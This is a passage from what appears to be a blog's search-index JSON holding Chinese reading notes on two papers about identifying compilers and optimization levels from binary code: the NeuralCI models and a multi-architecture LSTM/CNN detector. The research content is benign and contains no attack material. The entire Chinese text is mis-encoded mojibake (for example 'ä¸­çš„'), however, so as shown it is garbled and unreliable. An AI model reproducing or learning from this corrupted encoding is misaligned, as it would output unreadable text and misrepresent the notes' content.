ä¸­çš„ä¸¤ç§æ³¨æ„åŠ›æœºåˆ¶ä¸­çš„ä¸€ç§ç”Ÿæˆæ³¨æ„åŠ›å‘é‡ã€‚C é€‰æ‹©äº†å¦ä¸€ç§æ³¨æ„åŠ›æœºåˆ¶ï¼Œå¼•å…¥äº†æ¯ä¸ªå¥å­ä¸­çš„å•è¯çš„é‡è¦æ€§æœºåˆ¶ ä¸ºäº†ä½¿è¿™äº› RNN æ¨¡å‹å¯åŒºåˆ†ï¼Œæˆ‘ä»¬åœ¨ä»¥ä¸‹å®éªŒè¯„ä¼°ä¸­ä½¿ç”¨ NeuralBS GRUï¼ŒNeuralSD GRUï¼ŒNeuralAD GRU å’Œ NeuralQU GRUï¼ˆç¬¬ä¸‰ç§æ³¨æ„æœºåˆ¶æœ€ä»¤äººå°è±¡æ·±åˆ»çš„ç‰¹å¾æ˜¯å¼•å…¥å¤–éƒ¨æŸ¥è¯¢å‘é‡ï¼Œå› æ­¤æˆ‘ä»¬å°†å…¶ç®€ç§°ä¸º QUerybased-attentionï¼‰ã€‚ V å®éªŒå’Œè¯„ä¼° A æ•°æ®é›†çš„æ„å»º ä½¿ç”¨ä¸‰ç§ä¸åŒçš„ç¼–è¯‘å™¨ï¼ŒGCCï¼ˆ4.7ï¼Œ4.8ï¼Œ4.9ï¼Œ5.5ï¼Œ6.5ï¼Œ7.4ï¼‰ï¼ŒClangï¼ˆ3.8ï¼Œ5.0ï¼‰å’Œ ICC 19.0ï¼Œä½œä¸ºå·¥å…·é“¾è®¾ç½®æ¥ç¼–è¯‘æ¯ä¸ªé¡¹ç›®ï¼Œå¹¶ä½¿ç”¨ä¸åŒçš„ç¼–è¯‘å™¨ä¼˜åŒ–çº§åˆ«ï¼ˆO0ï¼ŒO1ï¼ŒO2ï¼ŒO3ï¼‰ã€‚ ç„¶åä½¿ç”¨IDA Proä»æ¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ ‡è¯†å’Œæå–å‡½æ•°ã€‚ä»…åŒ…å«å‡ æ¡æŒ‡ä»¤çš„å­˜æ ¹å‡½æ•°ç­‰å¾®ä¸è¶³é“çš„å‡½æ•°è¢«åˆ é™¤ã€‚åœ¨å½“å‰è®¾ç½®ä¸­ï¼ŒåŒ…å«å°‘äº10æ¡æŒ‡ä»¤çš„å‡½æ•°è¢«è§†ä¸ºå¾®ä¸è¶³é“çš„å‡½æ•°ã€‚ åœ¨è®­ç»ƒé˜¶æ®µï¼Œä¸ºé¿å…ç¥ç»æ¨¡å‹çœ‹åˆ°ä¸æµ‹è¯•é˜¶æ®µä¸­çš„å‡½æ•°å¤ªç›¸ä¼¼çš„å‡½æ•°ï¼Œä»…ä¿ç•™å”¯ä¸€çš„å‡½æ•°ã€‚å…·ä½“è€Œè¨€ï¼Œå¦‚æœä¸€ä¸ªå‡½æ•°ä¸å…¶ä»–å‡½æ•°å…·æœ‰ç›¸åŒçš„æ ‡å‡†åŒ–æŒ‡ä»¤ï¼Œåˆ™è®¤ä¸ºè¯¥å‡½æ•°æ˜¯å†—ä½™çš„ã€‚æ¯ä¸ªå‰©ä½™çš„å‡½æ•°éƒ½ç”¨ç”¨äºç¼–è¯‘åŒ…å«è¯¥å‡½æ•°çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¼–è¯‘å™¨è®¾ç½®è¿›è¡Œæ ‡è®°ã€‚ ä½¿ç”¨è¿™äº›è®¾ç½®ï¼Œä½œè€…æ„å»ºäº†ä¸€ä¸ªç”± 4, 810 ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„ 854, 858 ä¸ªå”¯ä¸€å‡½æ•°ç»„æˆçš„æ•°æ®é›†ï¼Œæ¯ä¸ªå‡½æ•°å¹³å‡åŒ…å«çº¦ 260 æ¡æŒ‡ä»¤ã€‚å‡½æ•°å¤§å°çš„åˆ†å¸ƒå¦‚å›¾ 6 æ‰€ç¤ºï¼Œå…¶ä¸­ 50%çš„å‡½æ•°åŒ…å«å°‘äº 100 æ¡æŒ‡ä»¤ï¼Œè¿‘ 90%çš„å‡½æ•°åŒ…å«å°‘äº 500 æ¡æŒ‡ä»¤ã€‚ B å®ç°ç»†èŠ‚å’Œå®éªŒè®¾ç½® æˆ‘ä»¬å·²ç»å®ç°äº† NeuralCI ä½œä¸ºåŸå‹å·¥å…·ã€‚å®ƒåˆ©ç”¨ IDA Pro è§£æäºŒè¿›åˆ¶æ–‡ä»¶ä»¥è·å–å‡½æ•°åŠå…¶åŸå§‹æ±‡ç¼–æŒ‡ä»¤ã€‚å‡½æ•°æŠ½è±¡æ¨¡å—ä½¿ç”¨ Java å®ç°ï¼Œç¥ç»å»ºæ¨¡æ¨¡å—ä½¿ç”¨ Python å’Œ TensorFlow æ¡†æ¶å®ç°ã€‚ä½¿ç”¨ gensim æä¾›çš„ skip-gram å®ç°ç”ŸæˆæŒ‡ä»¤åµŒå…¥å‘é‡ï¼ŒåµŒå…¥å¤§å° d è®¾ç½®ä¸º 100ã€‚æŒ‡ä»¤åºåˆ—çš„æœ€å¤§é•¿åº¦è®¾ç½®ä¸º 500ï¼Œä»¥ç¡®ä¿è¦†ç›–æ•°æ®é›†ä¸­è¿‘ 90%çš„å‡½æ•°çš„å…¨éƒ¨è¯­ä¹‰ã€‚åŸºäºå·ç§¯ç¥ç»ç½‘ç»œçš„æ¨¡å‹ä¸­å·ç§¯æ»¤æ³¢å™¨çš„æ•°é‡è®¾ç½®ä¸º 128ï¼ŒGRU éšè—çŠ¶æ€å‘é‡çš„ç»´åº¦ä¹Ÿæ˜¯ 128ã€‚ å¯¹äºå®éªŒè®¾ç½®ï¼Œæˆ‘ä»¬å°†æ•°æ®é›†éšæœºåˆ†ä¸ºè®­ç»ƒé›†ã€éªŒè¯é›†å’Œæµ‹è¯•é›†ï¼Œåˆ†åˆ«æŒ‰ 80ï¼…ã€10ï¼…å’Œ 10ï¼…çš„æ¯”ä¾‹ã€‚ç¥ç»ç½‘ç»œæ¨¡å‹ä½¿ç”¨ Tesla V100 GPU å¡è¿›è¡Œè®­ç»ƒï¼Œæ‰¹å¤„ç†å¤§å°ä¸º 128ï¼Œåˆå§‹å­¦ä¹ ç‡ä¸º 0.001ï¼ˆå½“éªŒè¯æŸå¤±è¿ç»­ 5 ä¸ª epoch æ²¡æœ‰æ”¹å–„æ—¶ï¼Œå°†å­¦ä¹ ç‡é™¤ä»¥ 10ï¼‰ï¼Œä½¿ç”¨ Adam ä¼˜åŒ–å™¨ã€‚å¯¹äºæ¯ä¸ª epochï¼Œè®­ç»ƒæ ·æœ¬éƒ½ä¼šè¢«æ‰“ä¹±ï¼Œå¹¶è®¡ç®—éªŒè¯é›†çš„å‡†ç¡®ç‡ã€‚æ­¤å¤–ï¼Œè¿˜ä½¿ç”¨ EarlyStopping æœºåˆ¶ï¼Œåœ¨éªŒè¯å‡†ç¡®ç‡ä¸å†ä¸Šå‡çš„ epoch ååœæ­¢è®­ç»ƒï¼Œä»¥é¿å…è¿‡åº¦æ‹Ÿåˆã€ä¸æ”¶æ•›ç­‰é—®é¢˜ã€‚æœ€åï¼Œæˆ‘ä»¬å°†å…·æœ‰æœ€ä½³å‡†ç¡®ç‡çš„æ¨¡å‹ä½œä¸ºæœ€ç»ˆæ¨¡å‹ï¼Œé’ˆå¯¹æ€§èƒ½æŒ‡æ ‡ï¼ˆåŒ…æ‹¬å‡†ç¡®ç‡ã€ç²¾åº¦ã€å¬å›ç‡å’Œ f1-scoreï¼‰åœ¨æµ‹è¯•é›†ä¸Šè¿›è¡Œè¿›ä¸€æ­¥è¯„ä¼°ã€‚\nè¯„ä¼° æˆ‘ä»¬åˆ†åˆ«è¯„ä¼°äº† NeuralCI åœ¨è¯†åˆ«ç¼–è¯‘å™¨å®¶æ—ã€ä¼˜åŒ–çº§åˆ«ã€ç¼–è¯‘å™¨ç‰ˆæœ¬å’Œç¼–è¯‘å™¨è®¾ç½®ç»„åˆæ–¹é¢çš„æ€§èƒ½ï¼Œå¹¶æŠ¥å‘Šäº†ç¥ç»ç½‘ç»œæ¨¡å‹ä¹‹é—´çš„æ¯”è¾ƒç»“æœï¼Œä»¥åŠä¸æ”¯æŒæ£€æµ‹ç›¸åº”ç¼–è¯‘å™¨è®¾ç½®çš„ç°æœ‰å‡½æ•°çº§æ–¹æ³•çš„æ¯”è¾ƒç»“æœã€‚\n1ï¼‰è¯†åˆ«ç¼–è¯‘å™¨ç³»åˆ—çš„æ€§èƒ½ å¦‚è¡¨ 2 æ‰€ç¤ºï¼ŒNeuralCI æ¨¡å‹åœ¨è¯†åˆ«ç¼–è¯‘å™¨å®¶æ—æ–¹é¢å®ç°äº†ç›¸å½“é«˜çš„ç²¾åº¦å’Œ f1-scoreã€‚åœ¨ç¼–è¯‘å™¨æ—è¯†åˆ«ä»»åŠ¡ä¸­ï¼ŒNeuralSD GRU æ¨¡å‹è¡¨ç°æœ€ä½³ï¼Œå‡†ç¡®ç‡ä¸º 98.7%ï¼Œf1-score ä¸º 0.987ã€‚ 2ï¼‰è¯†åˆ«ä¼˜åŒ–çº§åˆ«çš„æ€§èƒ½ å°† 4 ä¸ªä¼˜åŒ–çº§åˆ«å‹ç¼©ä¸º 2 ä¸ªç±»åˆ«ï¼šâ€œä½â€å’Œâ€œé«˜â€ã€‚ O0 å’Œ O1 è¢«è§†ä¸ºä½ä¼˜åŒ–ç±»ï¼ˆOLï¼‰ï¼Œè€Œ O2 å’Œ O3 è¢«è§†ä¸ºé«˜ä¼˜åŒ–ç±»ï¼ˆOHï¼‰ã€‚ æ­¤å¤–ï¼Œä½¿ç”¨å°†ä¼˜åŒ–çº§åˆ«å‹ç¼©ä¸º O0ï¼ŒO1 å’Œ OH çš„ 3 çº§æ‹†åˆ†æ–¹å¼æµ‹è¯•æ¨¡å‹çš„æ€§èƒ½ã€‚ ç»“æœè¡¨æ˜ï¼ŒNeuralCI æ¨¡å‹åœ¨ 2 çº§å’Œ 3 çº§ä¼˜åŒ–å‹ç¼©æƒ…å†µä¸‹éƒ½è¡¨ç°å‡ºç›¸å¯¹è‰¯å¥½çš„æ£€æµ‹ç»“æœï¼Œå¹¶ä¸”è·¨æ¨¡å‹è§‚å¯Ÿåˆ°å¾ˆå°‘çš„æ€§èƒ½å·®å¼‚ã€‚ ä»¤äººæƒŠè®¶çš„æ˜¯ï¼Œå¯¹äºæŸäº›æ¨¡å‹ï¼ŒNeuralCI åœ¨ 3 çº§ä¼˜åŒ–é€‰é¡¹è¯†åˆ«ä»»åŠ¡ä¸Šçš„è¡¨ç°ç”šè‡³æ¯” 2 çº§ä»»åŠ¡è¿˜è¦å¥½ã€‚ NeuralCI åœ¨è¯†åˆ«ä¼˜åŒ–çº§åˆ«æ–¹é¢çš„è¡¨ç°å› ç¼–è¯‘å™¨è€Œå¼‚ï¼Œåœ¨ GCC å’Œ Clang ä¸Šè§‚å¯Ÿåˆ°æœ€ä½³å’Œæœ€å·®çš„è¡¨ç°ã€‚ç¼–è¯‘å™¨ä¼˜åŒ–çº§åˆ«çš„ä¸åŒæ£€æµ‹éš¾åº¦æ„å‘³ç€ä¸åŒçš„ç¼–è¯‘å™¨é‡‡ç”¨ä¸åŒçš„å®šä¹‰ä¼˜åŒ–çº§åˆ«çš„æ–¹å¼ã€‚ 3ï¼‰è¯†åˆ«ç¼–è¯‘å™¨ç‰ˆæœ¬çš„æ€§èƒ½ 4ï¼‰è¯†åˆ«ç¼–è¯‘å™¨è®¾ç½®ç»„åˆçš„æ€§èƒ½ ä»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ£€æµ‹ç¼–è¯‘å™¨è®¾ç½®ç»„åˆé€šå¸¸å¯ä»¥é€šè¿‡è”åˆåº”ç”¨å¤šä¸ªæ¨¡å‹æ¥å®ç°ï¼Œæ¯ä¸ªæ¨¡å‹é’ˆå¯¹ä¸åŒçš„è®¾ç½®éƒ¨åˆ†ã€‚ é¦–å…ˆå¯ä»¥ä½¿ç”¨ç”¨äºç¼–è¯‘å™¨ç³»åˆ—è¯†åˆ«çš„è®­ç»ƒæ¨¡å‹æ¥æ£€æµ‹ç¼–è¯‘è¯¥å‡½æ•°çš„ç³»åˆ—ï¼Œç„¶åä½¿ç”¨ç›¸åº”äºå·²è¯†åˆ«çš„ç³»åˆ—çš„ä¼˜åŒ–çº§åˆ«è¯†åˆ«æ¨¡å‹è¿›ä¸€æ­¥æ£€æµ‹ä¼˜åŒ–çº§åˆ«ã€‚ å¦ä¸€ç§æ–¹æ³•æ˜¯è®­ç»ƒä¸€ä¸ªå¯ä»¥åŒæ—¶æ£€æµ‹è¿™äº›è®¾ç½®çš„å•ä¸ªæ¨¡å‹ã€‚ ä¸ºäº†æ£€æŸ¥ NeuralCI æ˜¯å¦èƒ½å¤Ÿèƒœä»»è¿™é¡¹å…·æœ‰æŒ‘æˆ˜æ€§çš„ä»»åŠ¡ï¼Œæˆ‘ä»¬é¦–å…ˆè¯„ä¼°å…¶è¯†åˆ«ç¼–è¯‘å™¨ç³»åˆ—å’Œä¼˜åŒ–çº§åˆ«çš„æ€§èƒ½ã€‚å¦‚è¡¨ 6 æ‰€ç¤ºçš„ç»“æœæ˜¾ç¤ºï¼ŒNeuralCI ä¸­çš„æ‰€æœ‰æ¨¡å‹éƒ½è¡¨ç°å‡ºç›¸å¯¹è‰¯å¥½ä¸”ç±»ä¼¼çš„æ£€æµ‹æ€§èƒ½ã€‚æ­¤å¤–ï¼Œè¡¨ 7 æŠ¥å‘Šäº† NeuralCI åœ¨åŒæ—¶è¯†åˆ«æ‰€æœ‰ç¼–è¯‘å™¨è®¾ç½®ç»„åˆæ–¹é¢çš„ç»“æœï¼Œå…¶ä¸­åœ¨ä¸åŒæ¨¡å‹ä¹‹é—´è§‚å¯Ÿåˆ°çš„å‡†ç¡®ç‡åœ¨ 81.5ï¼…è‡³ 83.8ï¼…ä¹‹é—´ã€‚ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fine-grained-compiler-identification-with-sequence-oriented-neural-modeling/","summary":"ä¸­æ–‡è¯‘åï¼šåŸºäºé¢å‘åºåˆ—çš„ç¥ç»æ¨¡å‹çš„ç»†ç²’åº¦ç¼–è¯‘å™¨è¯†åˆ« ä½œè€…ï¼šZHENZHOU TIAN å•ä½ï¼š è¥¿å®‰é‚®ç”µå¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #IEEE_ACCESS å…³é”®å­—ï¼š #","title":"Fine-Grained Compiler Identification With Sequence-Oriented Neural Modeling"},{"content":"ä¸­æ–‡è¯‘åï¼šå¤šä½“ç³»ç»“æ„äºŒè¿›åˆ¶ä»£ç ä¸­ç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«çš„è¯†åˆ« ä½œè€…ï¼šDAVIDE PIZZOLOTTO å•ä½ï¼šå¤§é˜ªå¤§å­¦ å›½å®¶ï¼š #æ—¥æœ¬ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #IEEE_ACCESS å…³é”®å­—ï¼š #ç¼–è¯‘ #äºŒè¿›åˆ¶ #ç¥ç»ç½‘ç»œ ä»£ç åœ°å€ï¼šGitHub - inoueke-n/optimization-detector: Optimization detection over compiled binaries ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-02-20 14:44\næ‘˜è¦ åœ¨æ¯”è¾ƒä¸åŒçš„äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œç¡®ä¿ç›¸åŒçš„ç¼–è¯‘å™¨å’Œç¼–è¯‘æ ‡å¿—å°¤å…¶é‡è¦ï¼Œä»¥é¿å…ä¸å‡†ç¡®æˆ–ä¸å¯é çš„åˆ†æã€‚ è¦ç†è§£ä½¿ç”¨äº†å“ªäº›æ ‡å¿—å’Œä¼˜åŒ–ï¼Œéœ€è¦å¯¹ç›®æ ‡ä½“ç³»ç»“æ„å’Œæ‰€ä½¿ç”¨çš„ç¼–è¯‘å™¨æœ‰æ·±å…¥çš„äº†è§£ã€‚ åœ¨è¿™é¡¹ç ”ç©¶ä¸­ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸¤ç§æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼Œç”¨äºæ£€æµ‹ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„ç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«ã€‚æˆ‘ä»¬ç ”ç©¶çš„ä¼˜åŒ–çº§åˆ«æ˜¯ x86_64ã€AArch64ã€RISC-Vã€SPARCã€PowerPCã€MIPS å’Œ ARM æ¶æ„ä¸­çš„ O0ã€O1ã€O2ã€O3 å’Œ Osã€‚æ­¤å¤–ï¼Œå¯¹äº x86_64 å’Œ AArch64 ä½“ç³»ç»“æ„ï¼Œæˆ‘ä»¬è¿˜ç¡®å®šç¼–è¯‘å™¨æ˜¯ GCC è¿˜æ˜¯ Clangã€‚ æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªè¶…è¿‡ 76000 ä¸ªäºŒè¿›åˆ¶æ•°æ®é›†ï¼Œå¹¶å°†å…¶ç”¨äºè®­ç»ƒã€‚æˆ‘ä»¬çš„å®éªŒè¡¨æ˜ï¼Œåœ¨æ£€æµ‹ç¼–è¯‘å™¨æ—¶ï¼Œå‡†ç¡®ç‡è¶…è¿‡ 99.95%ï¼Œåœ¨æ£€æµ‹ä¼˜åŒ–çº§åˆ«æ—¶ï¼Œæ ¹æ®æ¶æ„çš„ä¸åŒï¼Œå‡†ç¡®ç‡åœ¨ 92%åˆ° 98%ä¹‹é—´ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬åˆ†æäº†å½“æ•°æ®é‡æå…¶æœ‰é™æ—¶ï¼Œå‡†ç¡®æ€§çš„å˜åŒ–ã€‚æˆ‘ä»¬çš„ç ”ç©¶è¡¨æ˜ï¼Œä½¿ç”¨å‡½æ•°çº§ç²’åº¦å‡†ç¡®æ£€æµ‹ç¼–è¯‘å™¨æ ‡å¿—è®¾ç½®å’Œä¼˜åŒ–çº§åˆ«æ˜¯å¯èƒ½çš„ã€‚ 1å¼•è¨€ ç¼–è¯‘å™¨ä¿¡æ¯å’Œä¼˜åŒ–ç­‰çº§ç­‰ä¿¡æ¯å¯¹äºå„ç§åº”ç”¨ç¨‹åºéƒ½éå¸¸æœ‰ä»·å€¼ï¼Œæ¯”å¦‚å¯¹æ—§ç‰ˆæœ¬è¿›è¡Œåˆ†ç±»ï¼ŒæŸ¥æ‰¾æ¼æ´ï¼ŒæŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„ç›¸ä¼¼æ€§ï¼Œé‡å†™äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ–è€…åœ¨ç¼–è¯‘ç¯å¢ƒæ— æ³•æ§åˆ¶çš„æƒ…å†µä¸‹æä¾›å‡†ç¡®çš„é”™è¯¯æŠ¥å‘Šã€‚ è™½ç„¶æœ‰å‡ ç¯‡å…³äºæ£€æµ‹ç¼–è¯‘å™¨[5]å’Œå·¥å…·é“¾[8]ä½¿ç”¨çš„è®ºæ–‡ï¼Œä½†è¿™äº›æ–¹æ³•ä¸ä¾èµ–äºè‡ªåŠ¨å­¦ä¹ æ–¹æ³•ã€‚ä½¿ç”¨åŸºäºæœºå™¨å­¦ä¹ çš„æ–¹æ³•ï¼Œæä¾›æ–°æ•°æ®å¹¶é‡æ–°è¿è¡Œè®­ç»ƒä»¥æ£€æµ‹æ–°çš„ç¼–è¯‘å™¨æˆ–æ ‡å¿—å°±è¶³å¤Ÿäº†ã€‚ä½¿ç”¨æˆ‘ä»¬å·¥ä½œä¸­æä¾›çš„è‡ªåŠ¨æ•°æ®é›†ç”Ÿæˆï¼Œå¯¹äºæˆ‘ä»¬æƒ³è¦åˆ†ç±»çš„æ¯ä¸ªä¼˜åŒ–çº§åˆ«ï¼Œç”Ÿæˆè¿™äº›æ•°æ®æ‰€éœ€çš„æ—¶é—´æ˜¯å‡ ä¸ªå°æ—¶ã€‚ åœ¨è¿™é¡¹ç ”ç©¶ä¸­ï¼Œæˆ‘ä»¬æå‡ºäº†åœ¨ä¸åŒæ¶æ„ä¸­ä½¿ç”¨é•¿çŸ­æœŸè®°å¿†ç½‘ç»œ (LSTM)[9]å’Œå·ç§¯ç¥ç»ç½‘ç»œ (CNN)[10]æ¥è¯†åˆ«ç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«çš„æ–¹æ³•ã€‚ ä½œè€…æŒ‡å‡ºæœ¬æ–‡çš„è¿›æ­¥åœ¨äº æµ‹è¯•çš„ä¼˜åŒ–ç­‰çº§å’Œæµ‹è¯•æ•°é‡çš„å¢åŠ ï¼šä¼˜åŒ–ç­‰çº§æµ‹è¯•æ¬¡æ•°ç”±{O0, O2}å¢åŠ åˆ°{O0, O1, O2, O3, Os}ã€‚â€¢æµ‹è¯•çš„æ¶æ„æ•°é‡ä»{x86_64}å¢åŠ åˆ°{x86_64, AArch64, RISC-V, SPARC, PowerPC, MIPS, ARM32}ã€‚ æä¾›äº†æ•°æ®é›†å’Œè‡ªåŠ¨åŒ–ç”Ÿæˆæ•°æ®é›†çš„è„šæœ¬ ç¥ç»ç½‘ç»œç»“æ„çš„å®ç°å’Œè°ƒæ•´ 2åŠ¨æœº åœ¨ä¸€äº›åº”ç”¨åœºæ™¯ä¸­ç¼–è¯‘å™¨ä¿¡æ¯å’Œä¼˜åŒ–ç­‰çº§ä¿¡æ¯æ˜¯å¿…é¡»çš„ äºŒè¿›åˆ¶é‡å†™ä¸­ï¼Œä¸äº†è§£ä¼˜åŒ–ç­‰çº§å¯èƒ½ä¼šå¯¼è‡´é‡å†™çš„ç¼–è¯‘å¤±è´¥ åç¼–è¯‘ä¸­ï¼Œç¼–è¯‘å™¨ä¿¡æ¯å’Œä¼˜åŒ–ç­‰çº§ä¿¡æ¯ä¼šå¸®åŠ©åˆ¤æ–­åç¼–è¯‘åå¾—åˆ°çš„æºä»£ç çš„æ­£ç¡®æ€§ äºŒè¿›åˆ¶æ–‡ä»¶æ¯”è¾ƒä¸­ï¼Œç¼–è¯‘å™¨çš„ä¼˜åŒ–ä¼šå¸¦æ¥æå¤§çš„è¯¯å¯¼ 3å‰æœŸå·¥ä½œ æœ¬æ–‡å·¥ä½œç‰¹ç‚¹ï¼š\nä¸ä»…ç ”ç©¶æ ‡å¿—çš„æ£€æµ‹ï¼Œè¿˜ç ”ç©¶ç¼–è¯‘å™¨çš„æ£€æµ‹ ç ”ç©¶äº†ä¸ƒç§ä¸åŒæ¶æ„çš„æ£€æµ‹ï¼Œè€Œä¸æ˜¯åªæœ‰ä¸€ç§ åˆ†æç›®æ ‡ä¸ä»…æ˜¯æœ€å¤§é™åº¦åœ°æé«˜å‡†ç¡®æ€§ï¼Œè€Œä¸”æœ€å°åŒ–æ‰€éœ€çš„è¾“å…¥ æ•°æ®é›†æ¯”[25]å¤§ 100 å¤šå€ï¼Œåé©³äº†ä¹‹å‰ç ”ç©¶çš„ä¸€äº›è¯´æ³• 4æ–¹æ³• è¯•å›¾è§£å†³çš„é—®é¢˜æ˜¯ï¼Œå½“åªæœ‰ä¸€éƒ¨åˆ†äºŒè¿›åˆ¶ä»£ç å¯ç”¨æ—¶ï¼Œç¡®å®šä¼˜åŒ–çº§åˆ«ï¼Œå…·ä½“æ¥è¯´ï¼Œç»™å®šä¸€ä¸ªæ¥è‡ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ä»»æ„é•¿åº¦çš„å­—èŠ‚ v åºåˆ—ï¼Œæˆ‘ä»¬å¸Œæœ›è®­ç»ƒä¸€ä¸ªåˆ†ç±»å‡½æ•° Mflagsï¼Œå®ƒèƒ½å¤Ÿé¢„æµ‹ç¼–è¯‘æ ‡å¿—ï¼Œä»¥åŠä¸€ä¸ªåˆ†ç±»å‡½æ•° Mcompilerï¼Œå®ƒèƒ½å¤Ÿé¢„æµ‹æ‰€ä½¿ç”¨çš„ç¼–è¯‘å™¨ã€‚ Mflags å¯¹è¾“å…¥çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¼˜åŒ–çº§åˆ«è¿›è¡Œåˆ†ç±»ï¼Œä»¥å¸¸ç”¨çš„ä¼˜åŒ–æ°´å¹³{O0, O1, O2, O3, Os}ä¸ºç›®æ ‡ åŒæ—¶é’ˆå¯¹ä¸åŒçš„æ¶æ„è®­ç»ƒäº†ä¸åŒçš„ mflags å¹¶æœŸæœ›ç”¨æˆ·æ ¹æ®è¾“å…¥æ¶æ„é€‰æ‹©é¢„æµ‹æ¨¡å‹ã€‚äºŒè¿›åˆ¶æ–‡ä»¶çš„ä½“ç³»ç»“æ„å¾ˆå®¹æ˜“è¢«æ–‡ä»¶ç­‰å·¥å…·è¯†åˆ«ï¼Œå› æ­¤è¿™ä¸€äº‹å®å¹¶ä¸æ˜¯ä¸€ä¸ªé™åˆ¶ï¼Œå¹¶ç®€åŒ–äº†è®­ç»ƒã€‚ åŒæ ·é’ˆå¯¹ç¼–è¯‘å™¨ gcc å’Œ clangï¼Œä¹Ÿè®­ç»ƒäº†ä¸¤ä¸ªä¸åŒçš„ mcompiler æˆ‘ä»¬çš„ç›®æ ‡ä¸ä»…æ˜¯æœ€å¤§åŒ–ç²¾åº¦ï¼Œè€Œä¸”è¦ä½¿å­—èŠ‚ v çš„åºåˆ—å°½å¯èƒ½å°; ç¬¬ IV-B èŠ‚ä¸­è§£é‡Šå¦‚ä½•å°†äºŒè¿›åˆ¶ä»£ç è½¬æ¢ä¸º v (æˆ–å‡ ä¸ª v)ï¼Œå³æˆ‘ä»¬çš„å­¦ä¹ ç½‘ç»œæ‰€æœŸæœ›çš„è¾“å…¥ã€‚ ä¸ºäº†æ¯”è¾ƒä¸åŒæ¨¡å‹çš„æ€§èƒ½ï¼Œæˆ‘ä»¬ä½¿ç”¨å‰é¦ˆå·ç§¯ç¥ç»ç½‘ç»œ MCNN å’Œé•¿çŸ­æœŸè®°å¿†ç½‘ç»œ MLSTM æ¥è®­ç»ƒæ‰€æœ‰ä¸Šè¿°é…ç½®ï¼Œæ€»å…±äº§ç”Ÿ 7MCNN æ ‡å¿—ï¼Œ7 MLSTM æ ‡å¿—ï¼Œ2 MCNN ç¼–è¯‘å™¨å’Œ 2 MLSTM ç¼–è¯‘å™¨ã€‚è¿™äº›ç½‘ç»œåœ¨å‡ ä¸ªä¸åŒçš„æ•°æ®é›†ä¸­è¿›è¡Œè®­ç»ƒï¼Œåœ¨ç¬¬ IV-A èŠ‚ä¸­è¯¦ç»†è§£é‡Šï¼Œå¹¶æ¯”è¾ƒäº†å®ƒä»¬çš„é¢„æµ‹ç»“æœã€‚ æ•°æ®é›† ä½œè€…æŒ‡å‡ºå› ä¸ºéœ€è¦è¿›è¡Œç›‘ç£å­¦ä¹ ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦çŸ¥é“æ•°æ®é›†çš„ç¼–è¯‘å™¨ç±»å‹å’Œä¼˜åŒ–çº§åˆ«ï¼Œè™½ç„¶æˆ‘ä»¬åœ¨ç¼–è¯‘çš„æ—¶å€™å¯ä»¥æŒæ¡è¿™äº›ä¿¡æ¯ï¼Œä½†æ˜¯åœ¨é“¾æ¥çš„æ—¶å€™ï¼Œé™æ€åº“æ–‡ä»¶è¢«é“¾æ¥åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™äº›åº“æ–‡ä»¶çš„ç¼–è¯‘å™¨ä¿¡æ¯å’Œä¼˜åŒ–ç­‰çº§æˆ‘ä»¬å¹¶ä¸çŸ¥é“ï¼Œæˆ‘ä»¬éœ€è¦çš„äºŒè¿›åˆ¶æ–‡ä»¶è¢«è¿™äº›åº“æ–‡ä»¶æ±¡æŸ“äº†ã€‚ ä¸ºäº†é¿å…ä¸Šè¿°çš„é—®é¢˜ï¼Œä½œè€…é‡‡ç”¨åˆ›å»ºä¸€ä¸ªåªæœ‰å…±äº«åº“çš„ç³»ç»Ÿï¼Œç„¶åä½¿ç”¨è¯¥ç³»ç»Ÿæ„å»ºæ•°æ®é›†çš„æ–¹æ³•ã€‚ æœ¬æœºç¼–è¯‘ ä¸ºäº†è§£å†³æœ¬æœºæ„å»ºç³»ç»Ÿä¸­çš„é™æ€é“¾æ¥é—®é¢˜ï¼Œä½œè€…æ‰§è¡Œäº†ä»¥ä¸‹æ­¥éª¤:\næˆ‘ä»¬ä»ä¸»æœºä¸Šæ„å»ºäº†ä¸€ä¸ªæ²¡æœ‰ç‰¹å®šç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«çš„å·¥å…·é“¾ã€‚ æˆ‘ä»¬ç¡®ä¿åœ¨è¿™ä¸ªå·¥å…·é“¾ä¸­åªæ„å»ºå…±äº«åº“ã€‚2) æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªåªåŒ…å«å·¥å…·é“¾çš„ chroot ç¯å¢ƒï¼Œå°†å…¶ä¸åŸå§‹æ„å»ºç³»ç»Ÿéš”ç¦»å¼€æ¥ã€‚ æˆ‘ä»¬æ„å»ºäº†å®é™…çš„æ•°æ®é›†ï¼Œä½¿ç”¨æ‰€éœ€çš„ç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«ã€‚ äº¤å‰ç¼–è¯‘ ä½¿ç”¨ Ubuntu ç°æœ‰çš„å·¥å…·é“¾ æ²¡æœ‰æ„å»º 